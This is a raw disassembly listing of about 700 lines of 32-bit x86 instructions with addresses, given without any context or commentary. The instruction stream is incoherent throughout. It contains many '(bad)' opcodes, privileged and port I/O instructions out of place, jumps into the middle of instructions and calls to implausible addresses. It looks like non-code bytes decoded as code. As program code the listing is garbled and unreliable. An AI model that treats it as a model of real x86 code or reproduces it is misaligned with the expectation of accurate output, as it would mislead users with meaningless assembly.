  4309ec:	call   FWORD PTR ds:[ebx+ecx*4+0x70b4c4c7]
  4309f4:	test   DWORD PTR [ebx+0x574510f8],eax
  4309fa:	cmp    BYTE PTR [edx],bl
  4309fc:	pushf  
  4309fd:	add    BYTE PTR [ebx+0x4d80e468],cl
  430a03:	add    BYTE PTR [ebx],dh
  430a05:	inc    ebp
  430a06:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430a0c:	enter  0x8401,0x0
  430a10:	add    al,BYTE PTR [eax]
  430a12:	add    bh,bh
  430a14:	out    dx,eax
  430a15:	sbb    BYTE PTR [eax],al
  430a17:	dec    ebp
  430a18:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  430a1e:	sub    esi,DWORD PTR [ebx]
  430a20:	mov    ebp,DWORD PTR [eax-0x8]
  430a23:	add    bl,0x0
  430a26:	(bad)  
  430a27:	cmp    eax,ecx
  430a29:	or     BYTE PTR [edx+0x750114],al
  430a2f:	inc    DWORD PTR [ebp+0x18]
  430a32:	mov    eax,DWORD PTR [ebp-0x8]
  430a35:	mov    ebx,eax
  430a37:	(bad)  
  430a38:	retf   
  430a39:	inc    ebp
  430a3a:	into   
  430a3b:	mov    esi,eax
  430a3d:	int3   
  430a3e:	scas   eax,DWORD PTR es:[edi]
  430a3f:	push   es
  430a40:	mov    esi,DWORD PTR [ebp-0xc]
  430a43:	call   DWORD PTR [ebp+0x18]
  430a46:	sub    edi,DWORD PTR [ebp+0x3b]
  430a49:	mov    esi,DWORD PTR [edi-0x34]
  430a4c:	mov    eax,DWORD PTR [ebp-0x8]
  430a4f:	xor    ebx,eax
  430a51:	pushf  
  430a52:	mov    bh,0xbc
  430a55:	fadd   QWORD PTR [eax]
  430a57:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  430a5d:	mov    esi,DWORD PTR [ebx]
  430a5f:	in     al,0x33
  430a61:	ret    
  430a62:	add    eax,esi
  430a64:	add    eax,DWORD PTR [ebp+0xf]
  430a67:	mov    eax,ecx
  430a69:	in     al,0x4d
  430a6b:	ret    
  430a6c:	mov    eax,esi
  430a6e:	in     al,dx
  430a6f:	inc    ebp
  430a70:	rol    edi,1
  430a72:	sar    al,1
  430a74:	or     BYTE PTR [ebp+0x45e9f845],al
  430a7a:	add    BYTE PTR [ebx],dh
  430a7c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430a83:	test   ebx,eax
  430a85:	clc    
  430a86:	retf   
  430a87:	inc    ebp
  430a88:	into   
  430a89:	cmp    eax,0xc7af9cc6
  430a8e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430a95:	inc    ebp
  430a96:	cmp    edi,DWORD PTR [edi]
  430a98:	ja     0x430a36
  430a9a:	mov    eax,edi
  430a9c:	mov    esp,0x458567a8
  430aa1:	clc    
  430aa2:	mov    eax,DWORD PTR [ebp-0x8]
  430aa5:	mov    eax,ebx
  430aa7:	in     al,dx
  430aa8:	retf   
  430aa9:	ret    
  430aaa:	into   
  430aab:	mov    dh,0x7d
  430aae:	scas   eax,DWORD PTR es:[edi]
  430aaf:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  430ab5:	add    BYTE PTR [ebx],ch
  430ab7:	jmp    0xba0bf7
  430abc:	mov    eax,DWORD PTR [ebp-0x5c]
  430abf:	mov    eax,DWORD PTR [ebp-0x14]
  430ac2:	inc    ebp
  430ac3:	enter  0x458b,0xf8
  430ac7:	xor    eax,ebx
  430ac9:	add    ecx,ebx
  430acb:	cmp    ecx,esi
  430acd:	shufps xmm7,xmm4,0xaf
  430ad1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430ad7:	dec    ebp
  430ad8:	sub    esi,DWORD PTR [ebx]
  430ada:	cmp    esi,DWORD PTR [ebx]
  430adc:	ja     0x430ae1
  430ade:	mov    eax,DWORD PTR [ebx]
  430ae0:	lods   al,BYTE PTR ds:[esi]
  430ae1:	mov    db0,ecx
  430ae4:	inc    ebp
  430ae5:	dec    ebp
  430ae6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430aec:	retf   
  430aed:	rol    dh,1
  430aef:	or     al,0xce
  430af1:	inc    ebp
  430af2:	scas   eax,DWORD PTR es:[edi]
  430af3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430af9:	add    BYTE PTR [ebx],ch
  430afb:	add    BYTE PTR [ebx],bh
  430afd:	inc    ebp
  430afe:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430b04:	inc    ebp
  430b05:	retf   
  430b06:	mov    ecx,esi
  430b08:	clc    
  430b09:	(bad)  
  430b0a:	retf   
  430b0b:	scas   eax,DWORD PTR es:[edi]
  430b0c:	ret    
  430b0d:	mov    ecx,esi
  430b0f:	hlt    
  430b10:	(bad)  
  430b11:	push   ebp
  430b12:	scas   eax,DWORD PTR es:[edi]
  430b13:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430b19:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430b1f:	add    BYTE PTR [ebx],al
  430b21:	mov    eax,eax
  430b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b24:	inc    ebp
  430b25:	dec    ebp
  430b26:	xor    DWORD PTR [ebx],esi
  430b28:	pushf  
  430b29:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  430b2f:	rdmsr  
  430b31:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  430b39:	sar    eax,1
  430b3b:	rol    BYTE PTR [ebp+0x5],1
  430b3e:	xor    eax,DWORD PTR [ebp+0x3]
  430b41:	jmp    0x430b2e
  430b43:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430b49:	xor    eax,DWORD PTR [ebp+0x33]
  430b4c:	mov    eax,DWORD PTR [ebx]
  430b4e:	rol    BYTE PTR [ebx],1
  430b50:	test   BYTE PTR [edi],cl
  430b52:	fwait
  430b53:	shl    DWORD PTR [edx],0x4d
  430b56:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  430b5c:	xor    edx,eax
  430b5e:	add    eax,DWORD PTR ds:0xeb4d45e0
  430b64:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430b6a:	add    BYTE PTR [ebx],dh
  430b6c:	inc    ebp
  430b6d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430b73:	rdpmc  
  430b75:	rol    DWORD PTR [ebx],0x4d
  430b78:	loopne 0x430b05
  430b7a:	push   ebp
  430b7b:	in     al,dx
  430b7c:	mov    cl,dl
  430b7e:	adc    eax,edx
  430b80:	jb     0x430b87
  430b82:	add    BYTE PTR [ebp+0x45],al
  430b85:	jmp    0x430b12
  430b87:	mov    ebx,eax
  430b89:	test   al,0xcb
  430b8b:	dec    ebp
  430b8c:	dec    ebp
  430b8d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430b93:	add    ebx,DWORD PTR [ebx-0x743ecdf1]
  430b99:	dec    ebp
  430b9a:	mov    al,0x8b
  430b9c:	dec    ebp
  430b9d:	in     al,dx
  430b9e:	xor    edx,ecx
  430ba0:	xor    edx,eax
  430ba2:	add    eax,DWORD PTR [ebp+0x3]
  430ba5:	jbe    0x430bb6
  430ba7:	mov    eax,ecx
  430ba9:	test   al,0x45
  430bab:	dec    ebp
  430bac:	mov    DWORD PTR [ebx],esi
  430bae:	loopne 0x430be3
  430bb0:	inc    ebp
  430bb1:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430bb7:	rol    esi,0x45
  430bba:	scas   eax,DWORD PTR es:[edi]
  430bbb:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430bc1:	mov    eax,ecx
  430bc3:	hlt    
  430bc4:	dec    ebp
  430bc5:	inc    ebp
  430bc6:	mov    eax,edi
  430bc8:	loopne 0x430ba2
  430bca:	retf   
  430bcb:	test   esi,ecx
  430bcd:	clc    
  430bce:	scas   eax,DWORD PTR es:[edi]
  430bcf:	inc    ebp
  430bd0:	mov    eax,edi
  430bd2:	fdiv   st,st(0)
  430bd4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430bda:	fwait
  430bdb:	xor    esi,DWORD PTR [edx]
  430bdd:	pushf  
  430bde:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  430be4:	inc    esi
  430be6:	mov    ebp,DWORD PTR [eax-0x10]
  430be9:	inc    ebp
  430bea:	dec    ebp
  430beb:	xor    esi,DWORD PTR [ebx]
  430bed:	add    eax,DWORD PTR [ebx]
  430bef:	loopne 0x430c00
  430bf1:	dec    ebp
  430bf2:	ror    DWORD PTR [edx+0x7233084d],0x3
  430bf9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430bff:	lock fwait
  430c01:	ret    
  430c02:	xor    al,BYTE PTR [ebp-0x77]
  430c05:	mov    esi,esp
  430c07:	rol    BYTE PTR [ebp-0x7c],1
  430c0a:	xor    ebx,DWORD PTR [ebx-0x7772cd47]
  430c10:	call   edi
  430c12:	enter  0x4d45,0x8b
  430c16:	mov    esi,eax
  430c18:	fmul   st(3),st
  430c1a:	push   ebp
  430c1b:	dec    ebp
  430c1c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430c22:	ret    0xc19b
  430c25:	xor    al,BYTE PTR [esi-0x280276]
  430c2b:	dec    ebp
  430c2c:	jne    0x430c61
  430c2e:	mov    eax,DWORD PTR [ebx]
  430c30:	cld    
  430c31:	loopne 0x430be3
  430c33:	push   ebp
  430c34:	add    DWORD PTR [eax+0x72851100],ecx
  430c3a:	inc    DWORD PTR [eax]
  430c3c:	inc    DWORD PTR [ebp-0x75]
  430c3f:	mov    edi,esp
  430c41:	lock add bl,0x1
  430c45:	retf   
  430c46:	add    dh,al
  430c48:	xor    dh,cl
  430c4a:	inc    ebp
  430c4b:	scas   eax,DWORD PTR es:[edi]
  430c4c:	mov    eax,DWORD PTR [ebx]
  430c4e:	shl    al,0x0
  430c51:	inc    ebp
  430c52:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430c58:	call   0x461f90
  430c5d:	ud0    eax,ecx
  430c60:	adc    al,0x4d
  430c62:	inc    ebp
  430c63:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430c69:	lock push 0x338055
  430c6f:	add    eax,DWORD PTR [eax]
  430c71:	ud0    ecx,edx
  430c74:	sbb    BYTE PTR [ebp+0x5e],dl
  430c77:	xor    ecx,ecx
  430c79:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430c80:	push   ecx
  430c81:	add    BYTE PTR [ebp-0x38],cl
  430c84:	mov    DWORD PTR [esi-0x740004],eax
  430c8a:	cld    
  430c8b:	inc    ebp
  430c8c:	jmp    0x430c19
  430c8e:	mov    esp,esp
  430c90:	mov    ebx,eax
  430c92:	mov    eax,esi
  430c94:	clc    
  430c95:	scas   eax,DWORD PTR es:[edi]
  430c96:	icebp  
  430c97:	mov    esi,DWORD PTR [ebp-0x28]
  430c9a:	(bad)  
  430c9b:	retf   
  430c9c:	or     ecx,eax
  430c9e:	(bad)  
  430c9f:	dec    ebp
  430ca0:	pop    es
  430ca1:	(bad)  
  430ca2:	(bad)  
  430ca3:	or     BYTE PTR [esi],al
  430ca5:	jb     0x430c6d
  430ca7:	add    BYTE PTR [ebx],al
  430ca9:	inc    ebp
  430caa:	(bad)  
  430cab:	mov    ecx,DWORD PTR [edx]
  430cad:	fadd   st(6),st
  430caf:	ret    
  430cb0:	add    ah,BYTE PTR [ebp-0x37]
  430cb3:	int    0x55
  430cb5:	sub    ebp,esp
  430cb7:	add    edx,DWORD PTR [ecx-0x14]
  430cba:	inc    ebp
  430cbb:	inc    ebp
  430cbc:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430cc2:	cld    
  430cc3:	(bad)  
  430cc4:	(bad)  
  430cc5:	scas   eax,DWORD PTR es:[edi]
  430cc6:	loopne 0x430d03
  430cc8:	mov    DWORD PTR [edi],ecx
  430cca:	mov    ebp,ebp
  430ccc:	clc    
  430ccd:	push   eax
  430ccf:	push   DWORD PTR [ebp-0x4]
  430cd2:	mov    BYTE PTR [ebp+0xa],0xff
  430cd6:	(bad)  
  430cd7:	int3   
  430cd8:	or     BYTE PTR [eax],al
  430cda:	(bad)  
  430cdb:	lea    eax,[edi]
  430cdd:	ins    BYTE PTR es:[edi],dx
  430cde:	(bad)  
  430cdf:	inc    DWORD PTR [ecx]
  430ce1:	push   eax
  430ce2:	mov    BYTE PTR [ebp+0x9],0x8b
  430ce6:	leave  
  430ce7:	les    edx,FWORD PTR [ebp+0x0]
  430cea:	in     al,dx
  430ceb:	call   DWORD PTR [ecx-0x75]
  430cee:	inc    ebp
  430cef:	cld    
  430cf0:	mov    DWORD PTR [eax+0x8b01fc],eax
  430cf6:	cld    
  430cf7:	xor    BYTE PTR [eax-0x76a8f98b],bh
  430cfd:	pop    es
  430cfe:	mov    eax,DWORD PTR [eax]
  430d00:	clc    
  430d01:	test   eax,esi
  430d03:	je     0x430d7a
  430d05:	mov    eax,esi
  430d07:	cld    
  430d08:	add    al,0x80
  430d0a:	add    WORD PTR [ecx+0x0],ax
  430d0e:	fiadd  DWORD PTR [eax]
  430d10:	mov    BYTE PTR [eax],0x3d
  430d13:	push   0xffffffc3
  430d15:	push   edi
  430d16:	mov    edx,DWORD PTR [eax+0x51]
  430d19:	pop    edi
  430d1a:	lea    ebx,[ebx-0x8]
  430d1d:	ret    0x45
  430d20:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d26:	xchg   eax,edi
  430d28:	mov    DWORD PTR [ebp-0x75],ecx
  430d2b:	push   esi
  430d2c:	clc    
  430d2d:	jne    0x430cff
  430d2f:	mov    ecx,0xf8450b0b
  430d34:	(bad)  
  430d35:	push   cs
  430d36:	or     BYTE PTR [ebp-0x3a],dh
  430d39:	cmp    eax,DWORD PTR [ecx]
  430d3b:	pop    esi
  430d3c:	(bad)  
  430d3d:	or     al,0x5
  430d3f:	inc    eax
  430d40:	leave  
  430d41:	jmp    0x40cf:0x25564204
  430d48:	leave  
  430d49:	in     eax,dx
  430d4a:	inc    DWORD PTR [eax-0x75]
  430d4d:	fimul  DWORD PTR [ebx-0x228139be]
  430d53:	inc    eax
  430d54:	nop
  430d55:	loopne 0x430d56
  430d57:	ret    
  430d58:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d5e:	add    eax,0xff45e8f8
  430d63:	push   esi
  430d64:	push   DWORD PTR [ebp-0x39]
  430d67:	mov    eax,0x7edda46
  430d6c:	or     al,0x6
  430d6e:	push   DWORD PTR [ebp-0x3a]
  430d71:	cmp    eax,DWORD PTR [edx]
  430d73:	pop    esi
  430d74:	ret    
  430d75:	or     al,0x56
  430d77:	inc    ecx
  430d78:	push   ebp
  430d79:	jle    0x430d67
  430d7b:	inc    edx
  430d7c:	inc    ebp
  430d7d:	int    0x1
  430d7f:	inc    ecx
  430d80:	sub    BYTE PTR ds:0xe77541fc,ah
  430d86:	add    DWORD PTR [edx+0x1c],eax
  430d89:	retf   0xc38b
  430d8c:	adc    al,0x8b
  430d8e:	xchg   edx,eax
  430d8f:	push   ecx
  430d90:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d96:	rcl    DWORD PTR [esi-0x9],cl
  430d99:	jne    0x430deb
  430d9b:	mov    eax,0x7c80ece
  430da0:	rol    DWORD PTR [esi],cl
  430da2:	div    DWORD PTR [ebp+0x50]
  430da5:	cmp    ecx,edx
  430da7:	pop    esi
  430da8:	dec    BYTE PTR [edx]
  430daa:	in     al,dx
  430dab:	inc    edx
  430dac:	sub    esp,ecx
  430dae:	inc    eax
  430daf:	(bad)  
  430db0:	push   eax
  430db1:	add    edx,DWORD PTR [eax-0x1f]
  430db4:	push   edi
  430db5:	add    dh,dh
  430db7:	leave  
  430db8:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430dbc:	add    BYTE PTR [ecx+0x0],dl
  430dbf:	inc    ebp
  430dc0:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430dc6:	add    BYTE PTR [eax-0x7fbf448],bh
  430dcc:	add    al,0x2
  430dce:	jmp    0x57eb928
  430dd3:	jne    0x430dbd
  430dd5:	mov    eax,DWORD PTR [edx]
  430dd7:	or     BYTE PTR [eax],al
  430dd9:	inc    ecx
  430dda:	stc    
  430ddb:	in     eax,dx
  430ddc:	ss inc eax
  430dde:	aas    
  430ddf:	out    0x7d,eax
  430de1:	inc    ecx
  430de2:	mov    ebp,ecx
  430de4:	lock ret 0x7d
  430de8:	and    ecx,DWORD PTR [ebx-0x171777]
  430dee:	add    bh,bh
  430df0:	aad    0xd7
  430df2:	add    dh,cl
  430df4:	clts   
  430df6:	(bad)  
  430df7:	call   0xffce0cfc
  430dfc:	hlt    
  430dfd:	iret   
  430dfe:	jge    0x430dd6
  430e00:	rol    DWORD PTR [esi-0x80],cl
  430e03:	jmp    0x1c5d10
  430e08:	out    dx,al
  430e09:	mov    eax,DWORD PTR [ebx]
  430e0b:	(bad)  
  430e0c:	pop    esi
  430e0d:	push   es
  430e0e:	cmp    al,0xe8
  430e10:	sar    edi,0x8
  430e13:	inc    DWORD PTR [edi]
  430e15:	inc    esi
  430e16:	(bad)  
  430e17:	loopne 0x430e97
  430e19:	push   edi
  430e1a:	push   cs
  430e1b:	push   ebx
  430e1c:	add    BYTE PTR [ebx+0x24008b56],cl
  430e22:	add    BYTE PTR [ebp+0x50],al
  430e25:	push   eax
  430e26:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e2c:	sub    edx,DWORD PTR [esi-0x24]
  430e2f:	jne    0x430de7
  430e31:	lods   eax,DWORD PTR ds:[esi]
  430e32:	mov    edx,DWORD PTR [edx-0x34]
  430e35:	dec    esi
  430e36:	out    0x83,eax
  430e38:	into   
  430e39:	push   edi
  430e3b:	loopne 0x430e0b
  430e3d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e41:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e48:	rol    DWORD PTR [edx],0x8
  430e4b:	mov    esp,ecx
  430e4d:	cmp    DWORD PTR [ebx],0xc
  430e50:	mov    esi,0x5001c0
  430e55:	push   eax
  430e56:	push   cs
  430e57:	push   eax
  430e58:	(bad)  
  430e59:	sub    edx,edi
  430e5b:	push   esi
  430e5c:	adc    al,0xcb
  430e5e:	ins    DWORD PTR es:[edi],dx
  430e5f:	mov    eax,0x203e8
  430e64:	add    al,ah
  430e66:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e6d:	add    dh,al
  430e6f:	add    ah,ch
  430e71:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e77:	pop    ecx
  430e78:	or     eax,ebx
  430e7a:	cli    
  430e7b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e81:	lea    ebp,[ebx]
  430e83:	mov    edx,DWORD PTR [edx-0x4]
  430e86:	dec    ecx
  430e87:	inc    ebp
  430e88:	shr    BYTE PTR [ebx],0x4b
  430e8b:	and    al,0x0
  430e8d:	(bad)  
  430e8e:	jne    0x430ed5
  430e90:	pop    eax
  430e91:	mov    al,0x5a
  430e93:	call   0x14210f2
  430e98:	and    al,0x85
  430e9a:	push   edx
  430e9b:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e9f:	dec    ebp
  430ea0:	mov    cl,0x23
  430ea2:	jmp    0x430e90
  430ea4:	mov    al,0xe7
  430ea6:	call   0x1391194
  430eab:	shr    DWORD PTR [eax+ebx*2],cl
  430eae:	lock (bad) 
  430eb0:	adc    eax,0x757f008d
  430eb5:	out    0x58,eax
  430eb7:	cmp    al,0x7
  430eb9:	pop    edx
  430eba:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ec1:	push   ecx
  430ec2:	cld    
  430ec3:	mov    esi,0x3b0175
  430ec8:	and    al,0xb0
  430eca:	xor    BYTE PTR [edx+0x1],0x8b
  430ece:	add    ah,bh
  430ed0:	mov    edi,DWORD PTR [ebp-0x4]
  430ed3:	psubsw mm7,QWORD PTR [edi]
  430ed6:	add    DWORD PTR [ebp+0x0],ebp
  430ed9:	rcr    eax,1
  430edb:	mov    edi,ecx
  430edd:	and    eax,DWORD PTR [eax]
  430edf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ee5:	call   0x13011ce
  430eea:	add    al,cl
  430eec:	mov    ebp,esi
  430eee:	aam    0x83
  430ef0:	or     DWORD PTR [ecx],eax
  430ef2:	jne    0x430ee5
  430ef4:	mov    eax,DWORD PTR [eax]
  430ef6:	aam    0x0
  430ef8:	dec    ebp
  430ef9:	jne    0x430e86
  430efb:	cmp    ebx,eax
  430efd:	jb     0x430f4c
  430eff:	jmp    0x430e8c
  430f01:	mov    ebx,esp
  430f03:	int3   
  430f04:	dec    ebp
  430f05:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f0c:	mov    edx,0x8b0a8b
  430f11:	cmp    ecx,DWORD PTR [eax]
  430f13:	jb     0x430eec
  430f15:	pop    edx
  430f16:	push   edi
  430f17:	cli    
  430f18:	pop    es
  430f19:	mov    eax,ecx
  430f1b:	jb     0x430f1f
  430f1d:	add    DWORD PTR [ebx],0xa
  430f20:	mov    eax,DWORD PTR [ebx]
  430f22:	int3   
  430f23:	add    bh,BYTE PTR [esi+0x75d10006]
  430f29:	jmp    0x430eb6
  430f2b:	mov    al,0xe8
  430f2d:	call   0x10411af
  430f32:	add    edx,DWORD PTR [ecx+ecx*8]
  430f35:	pop    edi
  430f36:	or     BYTE PTR [ecx-0x73],bl
  430f39:	pop    ecx
  430f3a:	inc    edi
  430f3b:	xor    al,0xeb
  430f3d:	push   ecx
  430f3e:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f44:	call   0xb21049
  430f49:	int3   
  430f4a:	sbb    BYTE PTR [esi],ch
  430f4c:	inc    ebp
  430f4d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f53:	call   0x9c11c2
  430f58:	or     BYTE PTR [ebx-0x73],dl
  430f5b:	cmp    al,0x47
  430f5d:	mov    al,0x1
  430f5f:	jb     0x430f61
  430f61:	mov    al,0x10
  430f63:	push   eax
  430f64:	add    al,0x75
  430f66:	add    BYTE PTR [ebx],ch
  430f68:	add    ebx,esp
  430f6a:	int3   
  430f6b:	jne    0x430f7d
  430f6d:	movsx  edx,cl
  430f70:	add    DWORD PTR [eax],eax
  430f72:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f79:	mov    gs,edi
  430f7b:	add    BYTE PTR [eax-0x50],ch
  430f7e:	add    al,ch
  430f80:	mov    eax,DWORD PTR [ecx]
  430f82:	sub    eax,DWORD PTR [eax]
  430f84:	jb     0x430ffb
  430f86:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f8a:	jge    0x430f74
  430f8c:	add    al,0x1
  430f8e:	add    DWORD PTR [eax],0x0
  430f91:	jne    0x430f93
  430f93:	je     0x430fda
  430f95:	mov    eax,DWORD PTR [edi]
  430f97:	ror    BYTE PTR [ebp+0x4d],1
  430f9a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430fa1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430fa7:	mov    DWORD PTR [ebx],ebp
  430fa9:	fadd   DWORD PTR [eax+0x75]
  430fac:	inc    eax
  430fad:	pop    eax
  430fae:	lea    ebx,[ecx+0x4f]
  430fb1:	push   0xb1000003
  430fb6:	out    dx,eax
  430fb7:	add    ebp,DWORD PTR [edx+edx*2]
  430fba:	add    BYTE PTR [ebx+ecx*4],bh
  430fbd:	mov    ch,BYTE PTR [ebx]
  430fbf:	jb     0x431033
  430fc1:	add    al,0x89
  430fc3:	push   eax
  430fc4:	call   0x842b5d36
  430fc9:	add    DWORD PTR [eax+eax*1],eax
  430fcc:	jae    0x430fe2
  430fce:	icebp  
  430fcf:	inc    ebp
  430fd0:	mov    eax,DWORD PTR gs:[ecx]
  430fd3:	int3   
  430fd4:	out    dx,al
  430fd5:	loopne 0x431024
  430fd7:	sub    eax,DWORD PTR [edx]
  430fd9:	push   0xffffff83
  430fdb:	pop    esi
  430fdc:	push   cs
  430fdd:	jl     0x430ff8
  430fdf:	add    al,0xaf
  430fe1:	xor    eax,0x832b6d00
  430fe6:	mov    eax,DWORD PTR [edx]
  430fe8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fee:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ff4:	inc    ebp
  430ff5:	shr    ebx,0x3
  430ff8:	or     DWORD PTR [eax],0x4
  430ffb:	push   0xffffffa5
  430ffd:	pop    esi
  430ffe:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431005:	jmp    0x431064
  431007:	mov    edi,0xff0272
  43100c:	fdivr  QWORD PTR [ebp+0x5d]
  43100f:	push   0x4e
  431011:	pop    ecx
  431012:	call   0x435417
  431017:	mov    DWORD PTR [ebx],eax
  431019:	in     al,0xc8
  43101b:	rol    BYTE PTR [ebp-0x75],0xc1
  43101f:	call   0xad1200
  431024:	pop    esi
  431025:	enter  0xceff,0x8b
  431029:	repz mov ecx,DWORD PTR [ebp-0x34]
  43102d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431034:	je     0x431036
  431036:	or     DWORD PTR [ebx-0x74183b24],eax
  43103c:	jne    0x431022
  43103e:	jmp    0x431039
  431040:	push   DWORD PTR [edx-0x24]
  431043:	push   0x4d
  431045:	pop    ecx
  431046:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  43104a:	jge    0x431052
  43104c:	mov    eax,eax
  43104e:	sub    ebp,DWORD PTR [edx+0x24]
  431051:	pop    esi
  431052:	inc    ebp
  431053:	mov    esp,0x8b6077
  431058:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43105e:	lods   al,BYTE PTR ds:[esi]
  43105f:	add    BYTE PTR [ebx],bh
  431061:	enter  0xce73,0x49
  431065:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  43106d:	stc    
  43106e:	jge    0x4310e2
  431070:	jnp    0xdd4293df
  431076:	call   0xc6114c
  43107b:	fadd   st(0),st
  43107d:	dec    esi
  43107e:	ins    BYTE PTR es:[edi],dx
  43107f:	stc    
  431080:	cmp    al,0x73
  431082:	push   ebp
  431083:	mov    eax,0xf8028b
  431088:	jne    0x43104b
  43108a:	mov    esi,ecx
  43108c:	mov    esp,DWORD PTR [ebp+0x2c]
  43108f:	add    edi,DWORD PTR [ebp-0x24]
  431092:	sub    esp,eax
  431094:	and    al,0x45
  431096:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  43109c:	sbb    al,0xee
  43109e:	pop    esi
  43109f:	call   0x8310cf
  4310a4:	fsubr  st,st(3)
  4310a6:	sti    
  4310a7:	add    BYTE PTR gs:[ecx],bh
  4310aa:	add    eax,esp
  4310ac:	add    DWORD PTR [esi],eax
  4310ae:	rol    DWORD PTR [ebp+0x8],0x29
  4310b2:	mov    esp,eax
  4310b4:	clc    
  4310b5:	jne    0x43112c
  4310b7:	mov    eax,0x8b0673
  4310bc:	loopne 0x431103
  4310be:	loopne 0x431049
  4310c0:	lods   al,BYTE PTR ds:[esi]
  4310c1:	int3   
  4310c2:	inc    ebp
  4310c3:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310c7:	add    al,0xc3
  4310c9:	sub    ecx,DWORD PTR [ebp+0x47]
  4310cc:	(bad)  
  4310ce:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310d2:	add    eax,DWORD PTR [eax]
  4310d4:	call   0x644d1d9
  4310d9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310df:	dec    esi
  4310e0:	ins    DWORD PTR es:[edi],dx
  4310e1:	in     al,dx
  4310e2:	lea    eax,[eax]
  4310e4:	inc    ebp
  4310e5:	inc    ebp
  4310e6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310ec:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310f6:	and    al,0xdc
  4310f8:	ror    DWORD PTR [edx+0x24],0xf7
  4310fc:	or     BYTE PTR [ebp+0x4c],dh
  4310ff:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431103:	stos   BYTE PTR es:[edi],al
  431104:	adc    edx,edi
  431106:	inc    esp
  431107:	add    edi,DWORD PTR [eax]
  431109:	jne    0x4310ee
  43110b:	mov    DWORD PTR [eax-0x7449db04],ecx
  431111:	cmp    ecx,DWORD PTR [edi]
  431113:	sub    BYTE PTR [ebp-0x7e],dl
  431116:	sar    ebp,0xb
  431119:	jmp    FWORD PTR [edi+0x2400392a]
  43111f:	sub    esi,DWORD PTR [ebx-0x73]
  431122:	mov    esp,DWORD PTR [ecx+edi*4]
  431125:	mov    ecx,DWORD PTR [eax]
  431127:	and    BYTE PTR [eax],al
  431129:	jne    0x4310f5
  43112b:	sub    ebp,ecx
  43112d:	sbb    BYTE PTR [esi+0x32],ah
  431130:	dec    ebp
  431131:	push   ebp
  431132:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431138:	ret    
  431139:	mov    edx,ebp
  43113b:	leave  
  43113c:	sub    DWORD PTR [esi+0x24],ebx
  43113f:	ret    0x2b
  431142:	pop    ax
  431144:	push   ebp
  431145:	rol    BYTE PTR [ebx],0xeb
  431148:	add    DWORD PTR [ecx+0x6c0001],0x40
  43114f:	jb     0x4311a6
  431151:	ret    
  431152:	in     al,dx
  431153:	jecxz  0x4310e0
  431155:	push   esi
  431156:	xchg   esp,eax
  431157:	jne    0x431159
  431159:	cmp    edx,DWORD PTR [esi+0x1c]
  43115c:	jne    0x431142
  43115e:	mov    eax,DWORD PTR [ebp-0x77]
  431161:	ror    DWORD PTR [ebx+0x899408],0xe0
  431168:	mov    esi,DWORD PTR [ebp-0x75]
  43116b:	pop    esi
  43116c:	nop
